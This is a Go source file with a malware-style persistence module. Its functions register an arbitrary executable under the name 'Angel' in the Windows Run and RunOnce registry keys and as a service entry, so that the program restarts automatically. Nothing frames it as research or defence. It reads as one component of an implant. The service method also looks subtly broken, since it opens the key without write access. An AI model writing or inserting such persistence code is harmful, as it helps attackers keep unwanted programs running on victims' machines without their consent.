package windows

import (
"golang.org/x/sys/windows/registry"
)

type RegistryPersistence struct{}

func NewRegistryPersistence() *RegistryPersistence {
return &RegistryPersistence{}
}

func (r *RegistryPersistence) AddRunKey(path string) error {
k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
if err != nil {
return err
}
defer k.Close()
return k.SetStringValue("Angel", path)
}

func (r *RegistryPersistence) AddRunOnceKey(path string) error {
k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\RunOnce`, registry.SET_VALUE)
if err != nil {
return err
}
defer k.Close()
return k.SetStringValue("Angel", path)
}

func (r *RegistryPersistence) AddServicesKey(path string) error {
k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Services\Angel`, registry.CREATE_SUB_KEY)
if err != nil {
return err
}
defer k.Close()
return k.SetStringValue("ImagePath", path)
}
